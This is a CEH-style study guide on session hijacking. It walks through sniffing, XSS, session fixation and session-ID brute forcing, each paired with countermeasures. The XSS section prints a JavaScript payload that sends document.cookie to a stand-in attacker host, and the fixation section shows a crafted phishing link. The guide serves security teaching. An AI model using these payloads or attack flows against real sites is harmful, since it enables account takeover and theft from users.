# CEH v12 Module: Session Hijacking

## 1. Introduction to Session Hijacking

### What is a Session?
When you log into a website, the server needs a way to remember you as you move from page to page. Since the web protocol (HTTP) is stateless (it forgets you after each request), the server gives your browser a temporary "keycard" called a **Session ID** or **Session Token**. Your browser shows this keycard to the server with every request you make.

### What is Session Hijacking?
**Session Hijacking** is an attack where a hacker steals a user's active session keycard (the Session ID). By using this stolen ID, the attacker can impersonate the legitimate user and gain access to their account and data without needing a password. From the server's point of view, the attacker *is* the user.

### Why is it Dangerous? (The Impact)
A successful session hijack can lead to:
* **Identity Theft:** The attacker can access and steal personal information (name, address, etc.).
* **Financial Loss:** The attacker can perform actions like transferring money, making purchases, or accessing credit card information.
* **Unauthorized Access:** Gaining access to sensitive corporate data or private user accounts.
* **Further Attacks:** Using the hijacked account to launch attacks on other users.

---

## 2. Types of Session Hijacking

### A. Passive Session Hijacking
In a passive attack, the attacker simply "listens" to the network traffic and captures the session token without interfering. This is like someone secretly taking a photo of your keycard as you walk by.
* **Key Technique:** Packet Sniffing.
* **Detection:** Very difficult to detect as the attacker is not actively engaging with the client or server.

### B. Active Session Hijacking
In an active attack, the attacker not only steals the session token but also takes control of the session, often by kicking the real user out. This is like someone stealing your keycard and then locking the door behind them.
* **Key Technique:** Man-in-the-Middle (MitM) attacks.
* **Detection:** Easier to detect because the legitimate user's session will be disrupted or terminated unexpectedly.

---

## 3. Session Hijacking Techniques

Application-Level Session Hijacking is the most common form of this attack. It focuses on stealing the session token (e.g., cookie) that an application uses to identify an authenticated user. Here are the primary techniques an ethical hacker must know.

#### **1. Packet Sniffing (also known as Session Sidejacking)**

  * **Concept:** This is a passive attack where the adversary eavesdrops on network traffic to capture session tokens that are being transmitted in cleartext.

  * **Attacker's Goal:** To find and steal a valid session cookie by monitoring unencrypted network communications.

  * **How It Works (The Attack Flow):**

    1.  **Positioning:** The attacker connects to an insecure network where they can monitor other users' traffic. Public Wi-Fi hotspots (cafes, airports, hotels) are the most common environments for this.
    2.  **Tools:** The attacker launches a network protocol analyzer like **Wireshark** or its command-line equivalent, **TShark**.
    3.  **Capture:** The tool is set to "promiscuous mode," allowing it to capture all packets traversing the network, not just those addressed to the attacker.
    4.  **The Victim's Action:** A user on the same network logs into a website that uses **HTTP** (unencrypted) or has mixed content where the session cookie is sent over HTTP, even if the login was over HTTPS.
    5.  **Interception:** The attacker's Wireshark capture shows the entire HTTP request in plaintext. They can apply a simple display filter, such as `http.cookie`, to instantly locate the relevant packets.
    6.  **Extraction:** The attacker inspects the packet details and copies the value from the `Cookie:` header (e.g., `Cookie: sessionid=aBcDeFg123456789; user=test`).
    7.  **Impersonation:** The attacker uses a browser extension (like **Cookie-Editor**) to manually insert the stolen cookie into their own browser. When they refresh the page for that website, the server reads the stolen cookie, recognizes it as a valid session, and grants the attacker full access to the victim's account.

  * **Vulnerability Checklist:**

      * Is the application using HTTP instead of HTTPS?
      * Does the site have mixed content (HTTPS and HTTP), allowing the cookie to be sent over an insecure channel?
      * Are users likely to access the application from untrusted networks?

  * **Primary Countermeasure:** The single most effective countermeasure is to **enforce TLS/SSL (HTTPS) across the entire website**. This encrypts all traffic between the client and server, making the captured data unreadable to a sniffer. The **`Secure`** flag on the cookie should also be set.

-----

#### **2. Cross-Site Scripting (XSS)**

  * **Concept:** An injection attack where the adversary embeds malicious client-side script (usually JavaScript) into a trusted web page.

  * **Attacker's Goal:** To leverage a website's trust to force a victim's browser to execute a script that steals their session cookie and sends it to the attacker.

  * **How It Works (The Attack Flow):**

    1.  **Discovery:** The attacker uses tools like **Burp Suite** or **OWASP ZAP** to find an XSS vulnerability on a target website (e.g., a search bar, comment field, or profile page that doesn't properly sanitize user input).
    2.  **Payload Crafting:** The attacker writes a JavaScript payload. A common payload creates a new image object and sets its source to the attacker's server, with the victim's cookie appended as a query parameter.
        ```javascript
        <script>
          new Image().src = "http://attacker-controlled-server.com/logger.php?cookie=" + document.cookie;
        </script>
        ```
    3.  **Injection:**
          * For **Stored XSS**, they inject this script into a comment field or forum post.
          * For **Reflected XSS**, they embed it in a URL and trick a user into clicking it via a phishing email.
    4.  **Execution:** A victim visits the compromised page or clicks the malicious link. Their browser, trusting the website, renders the HTML and executes the attacker's script.
    5.  **Exfiltration:** The script runs, grabs the victim's session cookie using `document.cookie`, and makes a request to the attacker's server, sending the cookie along.
    6.  **Hijacking:** The attacker checks their server logs, finds the stolen cookie, and uses it to impersonate the victim, just as in the sniffing attack.

  * **Vulnerability Checklist:**

      * Does the application properly validate and sanitize all user-supplied input?
      * Does the application encode output to prevent it from being interpreted as active content by the browser?

  * **Primary Countermeasure:** Setting the **`HttpOnly`** flag on the session cookie is the most direct defense. This flag prevents the cookie from being accessed by any client-side scripts, so even if an XSS flaw exists, the `document.cookie` call will not be able to read the session token.

-----

#### **3. Session Fixation**

  * **Concept:** An attack where the adversary provides a known session ID to a user, which the user then authenticates with. The attacker can then use that same pre-known ID to access the user's session.

  * **Attacker's Goal:** To bypass the need to steal the token after login by setting the token *before* login.

  * **How It Works (The Attack Flow):**

    1.  **Obtain a Token:** The attacker visits the target website's login page. The server issues them a new, unauthenticated session ID (e.g., `SID=abcdef123`).
    2.  **"Fix" the Token:** The attacker must now trick the victim into using this specific session ID. This is often done by sending a phishing email with a crafted link: `http://vulnerable-site.com/login?SID=abcdef123`.
    3.  **Victim Logs In:** The victim clicks the link, which sets the `SID=abcdef123` cookie in their browser. They then proceed to enter their own valid username and password.
    4.  **The Application Flaw:** The server authenticates the user's credentials successfully. **Crucially, it fails to generate a new session ID.** It simply elevates the privilege of the existing session (`SID=abcdef123`) from "unauthenticated" to "authenticated."
    5.  **Impersonation:** The attacker, who already knows the session ID is `abcdef123`, can now simply refresh their browser. Since that session is now authenticated, the server grants them full access to the victim's account.

  * **Vulnerability Checklist:**

      * Does the application generate a new session token after a user successfully authenticates?
      * Does the application accept session identifiers from URL parameters?

  * **Primary Countermeasure:** The application **must** destroy the pre-login session and **regenerate a new session token** immediately upon successful authentication.

-----

#### **4. Brute Forcing Session IDs**

  * **Concept:** An automated, trial-and-error attack where the adversary attempts to guess a valid session ID.

  * **Attacker's Goal:** To find an active session ID by cycling through all possible values until a valid one is found.

  * **How It Works (The Attack Flow):**

    1.  **Analysis:** The attacker analyzes the session ID to determine its length, character set, and any discernible patterns.
    2.  **Tool Configuration:** They use an automation tool like **Burp Suite Intruder** or **OWASP ZAP's Fuzzer**.
    3.  **Request Setup:** They capture a valid request that requires authentication (e.g., a `GET` request to `/account/profile`).
    4.  **Payload Generation:** They mark the session ID's value as the injection point and configure the tool to generate payloads. If the ID is a 6-digit number, they configure it to try all values from `000000` to `999999`.
    5.  **Attack Execution:** The tool sends thousands of requests, each with a different guessed ID.
    6.  **Analysis of Results:** The attacker analyzes the server's responses. A failed guess might result in an HTTP `302 Redirect` (to the login page) or `401 Unauthorized` error. A successful guess will return an HTTP `200 OK` and the content of the requested page. The attacker can easily filter the results to find the successful guess.

  * **Vulnerability Checklist:**

      * Are the session IDs short?
      * Do the session IDs have low entropy (e.g., are they just numbers or lowercase letters)?
      * Are the session IDs generated using a predictable or non-random algorithm?

  * **Primary Countermeasure:** Use **long (at least 128 bits), cryptographically random session IDs**. A sufficiently random and long ID makes the keyspace too large to brute-force in any practical amount of time.

## 4. Session Hijacking Mitigation (Countermeasures)

As an ethical hacker, your job is to identify these weaknesses and recommend fixes.

* **1. Encrypt All Traffic (Use TLS/HTTPS):** This is the most important defense. It encrypts the entire session, making it impossible for attackers to sniff the session ID from the network.
* **2. Use Strong, Unpredictable Session IDs:** Session IDs should be long, complex, and generated using a cryptographically secure random number generator. Never use predictable data.
* **3. Regenerate Session ID After Login:** To prevent Session Fixation, a web application **must** destroy the old session ID and generate a new one immediately after a user successfully authenticates.
* **4. Use the `HttpOnly` Cookie Flag:** This is a powerful defense against XSS. When this flag is set on a cookie, it tells the browser not to allow scripts (like JavaScript) to access it. This means even if an attacker finds an XSS flaw, they cannot use it to steal the cookie.
* **5. Use the `Secure` Cookie Flag:** This flag tells the browser to *only* send the cookie over an encrypted HTTPS connection. This prevents the cookie from ever being accidentally sent over an insecure HTTP connection.
* **6. Implement Session Timeouts:** Automatically end sessions after a period of inactivity (e.g., 15 minutes) to reduce the window of opportunity for an attacker to use a stolen token.
* **7. Provide a Clear Logout Function:** Ensure the logout button properly destroys the session on the **server-side**, not just on the client's browser.
